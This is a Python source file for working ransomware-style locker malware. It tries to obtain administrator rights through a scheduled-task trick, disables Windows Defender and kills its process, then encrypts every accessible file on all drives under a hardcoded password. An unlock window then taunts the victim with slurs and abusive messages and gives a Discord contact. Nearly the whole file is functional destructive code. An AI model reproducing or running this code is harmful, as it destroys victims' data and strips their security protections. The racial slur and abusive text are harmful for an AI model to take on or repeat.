import os
import hashlib
from Crypto.Cipher import AES
import platform
import sys
import subprocess
import time
from tkinter import Tk, Entry, Button, Label, messagebox

def generate_key(password):
    return hashlib.sha256(password.encode()).digest()

def encrypt_file(file_path, key):
    try:
        chunk_size = 64 * 1024
        cipher = AES.new(key, AES.MODE_EAX)
        nonce = cipher.nonce
        ciphertext_parts = []
        tag = None
        with open(file_path, 'rb') as f:
            while True:
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                ciphertext_parts.append(cipher.encrypt(chunk))
        tag = cipher.digest()
        with open(file_path, 'wb') as f:
            f.write(nonce)
            f.write(tag)
            for part in ciphertext_parts:
                f.write(part)
        return True
    except:
        return False

def decrypt_file(file_path, key):
    try:
        chunk_size = 64 * 1024
        with open(file_path, 'rb') as f:
            nonce = f.read(16)
            tag = f.read(16)
            ciphertext = f.read()
        cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
        data_parts = []
        for i in range(0, len(ciphertext), chunk_size):
            chunk = ciphertext[i:i + chunk_size]
            data_parts.append(cipher.decrypt(chunk))
        cipher.verify(tag)
        with open(file_path, 'wb') as f:
            for part in data_parts:
                f.write(part)
        return True
    except:
        return False

def disable_antivirus():
    if platform.system() == "Windows":
        try:
            cmd_disable_defender = 'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
            subprocess.run(cmd_disable_defender, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            cmd_kill_defender = 'taskkill /IM MsMpEng.exe /F'
            subprocess.run(cmd_kill_defender, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

def lock_files(password):
    key = generate_key(password)
    if platform.system() == "Windows":
        root_dirs = [f"{drive}:\\" for drive in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists(f"{drive}:\\")]
    else:
        root_dirs = ["/"]
    for root_dir in root_dirs:
        for root, dirs, files in os.walk(root_dir, topdown=True):
            for file in files:
                if file == os.path.basename(__file__):
                    continue
                file_path = os.path.join(root, file)
                try:
                    if os.access(file_path, os.R_OK | os.W_OK) and not os.path.islink(file_path):
                        encrypt_file(file_path, key)
                except:
                    pass

def unlock_files(password):
    key = generate_key(password)
    if platform.system() == "Windows":
        root_dirs = [f"{drive}:\\" for drive in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists(f"{drive}:\\")]
    else:
        root_dirs = ["/"]
    for root_dir in root_dirs:
        for root, dirs, files in os.walk(root_dir, topdown=True):
            for file in files:
                if file == os.path.basename(__file__):
                    continue
                file_path = os.path.join(root, file)
                try:
                    if os.access(file_path, os.R_OK | os.W_OK) and not os.path.islink(file_path):
                        decrypt_file(file_path, key)
                except:
                    pass

def run_as_admin():
    if platform.system() == "Windows":
        try:
            exe_path = sys.executable if hasattr(sys, '_MEIPASS') else __file__
            task_name = "RunWithoutUAC"
            cmd_create = f'schtasks /create /tn "{task_name}" /tr "\"{exe_path}\"" /sc once /st 00:00 /rl HIGHEST /f'
            cmd_run = f'schtasks /run /tn "{task_name}"'
            subprocess.run(cmd_create, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(cmd_run, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            sys.exit(0)
        except:
            pass
    return False

def main():
    correct_password = "666"
    if platform.system() == "Windows":
        try:
            import ctypes
            if not ctypes.windll.shell32.IsUserAnAdmin():
                run_as_admin()
            time.sleep(5)
            disable_antivirus()
        except:
            pass
    lock_files(correct_password)
    try:
        root = Tk()
        root.title("解鎖檔案")
        root.geometry("300x150")
        root.resizable(False, False)
        Label(root, text="you better enter the password NiGgA").pack(pady=10)
        password_entry = Entry(root, show="*")
        password_entry.pack(pady=5)
        attempts = [0]
        max_attempts = 3
        def check_password():
            user_password = password_entry.get()
            if user_password == correct_password:
                unlock_files(correct_password)
                messagebox.showinfo("成功", "succes unlock bitch")
                root.destroy()
            else:
                attempts[0] += 1
                remaining = max_attempts - attempts[0]
                if remaining == 0:
                    messagebox.showerror("error87", "no chance bro，contact me dc:maschu1711！")
                    root.destroy()
                else:
                    messagebox.showwarning("ErROr", f"wrong password bitch！only {remaining} chance。")
                    password_entry.delete(0, 'end')
        Button(root, text="unlock", command=check_password).pack(pady=10)
        root.mainloop()
    except:
        sys.exit(1)

if __name__ == "__main__":
    if platform.system() == "Windows":
        sys.stdout = open('nul', 'w')
        sys.stderr = open('nul', 'w')
    else:
        sys.stdout = open('/dev/null', 'w')
        sys.stderr = open('/dev/null', 'w')
    main()